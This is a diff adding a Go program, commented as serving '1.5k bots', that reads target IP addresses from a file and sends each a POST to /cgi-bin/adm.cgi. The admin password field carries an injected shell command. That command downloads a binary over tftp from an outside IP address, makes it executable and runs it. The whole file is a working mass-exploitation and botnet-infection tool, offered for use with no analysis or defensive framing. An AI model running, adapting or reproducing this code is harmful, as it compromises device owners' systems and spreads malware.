@@ -1,0 +1,77 @@
+// 1.5k bots
+
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"fmt"
+	"net/http"
+	"os"
+	"sync"
+)
+
+func main() {
+	// Open the file containing IP addresses
+	file, err := os.Open("ips.txt")
+	if err != nil {
+		fmt.Println("Error opening file:", err)
+		return
+	}
+	defer file.Close()
+
+	var wg sync.WaitGroup
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		targetIP := scanner.Text()
+		wg.Add(1)
+		go func(ip string) {
+			defer wg.Done()
+			sendRequest(ip)
+		}(targetIP)
+	}
+
+	wg.Wait()
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading file:", err)
+		return
+	}
+}
+
+func sendRequest(targetIP string) {
+	targetURL := fmt.Sprintf("http://%s/cgi-bin/adm.cgi", targetIP)
+	payload := "page=sysAdm&admuser=admin&admpass=aquario$(cd /tmp ; rm -rf splmpsl ; tftp -g -r jklmpsl 85.217.144.207 69; chmod 777 jklmpsl ;./jklmpsl fortinet)&admwatchdog=1"
+
+	req, err := http.NewRequest("POST", targetURL, bytes.NewBufferString(payload))
+	if err != nil {
+		fmt.Printf("Error creating request for %s: %s\n", targetIP, err)
+		return
+	}
+
+	req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
+	req.Header.Set("X-Requested-With", "XMLHttpRequest")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36")
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+	req.Header.Set("Origin", fmt.Sprintf("http://%s", targetIP))
+	req.Header.Set("Referer", fmt.Sprintf("http://%s/adm/management.shtml", targetIP))
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Cookie", "username=%5Bobject%20HTMLInputElement%5D")
+	req.Header.Set("Connection", "close")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Printf("Error sending request to %s: %s\n", targetIP, err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusOK {
+		fmt.Printf("Exploit successfully sent to %s\n", targetIP)
+	} else {
+		fmt.Printf("Failed to send exploit to %s. Response status: %s\n", targetIP, resp.Status)
+	}
+}
